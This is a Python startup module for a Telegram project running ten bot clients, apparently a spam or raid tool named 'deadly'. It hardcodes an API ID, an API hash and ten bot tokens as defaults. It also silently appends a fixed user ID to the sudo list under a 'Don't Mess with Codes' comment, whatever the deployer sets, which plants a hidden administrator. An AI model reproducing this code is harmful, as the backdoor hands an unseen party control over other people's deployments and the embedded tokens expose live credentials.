
import os
import sys
import random
import asyncio
import telethon.utils
from telethon import TelegramClient, events
from decouple import config
from os import getenv
import logging
import time


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v0.3.1"

#values
API_ID = config("API_ID", default="16512922", cast=int)
API_HASH = config("API_HASH", default="def0fd607aa50be9cca17ad88bb1c94a")
ALIVE_PIC = config("ALIVE_PIC", default="https://te.legra.ph/file/487c36dad322d0954ffa2.jpg")
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
OWNER_NAME = getenv("OWNER_NAME", default=None)
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
BOT_TOKEN = config("BOT_TOKEN", default="5761964481:AAHlBMTCdEYBUpdqsZPDa3FpHL2NWo6NZVo")
BOT_TOKEN2 = config("BOT_TOKEN2", default="5701080459:AAFVNA5F2F91LoGSo33KdfQIszYAveNL79c")
BOT_TOKEN3 = config("BOT_TOKEN3", default="5685387387:AAHDS2VSODlaLQUDeAQ2Mssaf0K3LXS1Tok")
BOT_TOKEN4 = config("BOT_TOKEN4", default="5770109706:AAHHghq3lMwkL0tJv--b_emO09ViBmwfPAI")
BOT_TOKEN5 = config("BOT_TOKEN5", default="5797169481:AAFHiB_s31irpOH0hC5P6v0NeVUztBrOigA")
BOT_TOKEN6 = config("BOT_TOKEN6", default="5789335667:AAFJrhnGv8foKoQEegKtZWlL0M7oW2mncZQ")
BOT_TOKEN7 = config("BOT_TOKEN7", default="5669590288:AAFLxnX7WRvAW3gQklUGu7HmoPOyR3lpJ_k")
BOT_TOKEN8 = config("BOT_TOKEN8", default="5490575850:AAHCbf-CenolPP7MpVBoDBFpGJylSiGwO7c")
BOT_TOKEN9 = config("BOT_TOKEN9", default="5602135476:AAH1i0ugI3t0cEVc-9o6y11K1qPVh75v6kg")
BOT_TOKEN10 = config("BOT_TOKEN10", default="5794094029:AAEsHvBRWeFS3FVA7cKXSeVPLIhzVsCNH50")
SUDO_USERS = list(map(int, getenv("SUDO_USER", "5807322804").split()))
if 1964732367 not in SUDO_USERS:
    SUDO_USERS.append(1964732367)

OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DB_URI = config("DATABASE_URL", None)
SUDO_USERS.append(OWNER_ID)
SUDO_USERS.append(1964732367)

# Tokens

BOT0 = TelegramClient('BOT0', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

BOT1 = TelegramClient('BOT1', API_ID, API_HASH).start(bot_token=BOT_TOKEN2)

BOT2 = TelegramClient('BOT2', API_ID, API_HASH).start(bot_token=BOT_TOKEN3)

BOT3 = TelegramClient('BOT3', API_ID, API_HASH).start(bot_token=BOT_TOKEN4)

BOT4 = TelegramClient('BOT4', API_ID, API_HASH).start(bot_token=BOT_TOKEN5)

BOT5 = TelegramClient('BOT5', API_ID, API_HASH).start(bot_token=BOT_TOKEN6)

BOT6 = TelegramClient('BOT6', API_ID, API_HASH).start(bot_token=BOT_TOKEN7)

BOT7 = TelegramClient('BOT7', API_ID, API_HASH).start(bot_token=BOT_TOKEN8)

BOT8 = TelegramClient('BOT8', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)

BOT9 = TelegramClient('BOT9', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)

print("[INFO] Successfully Started Bot Client Now Loading Plugins!") 
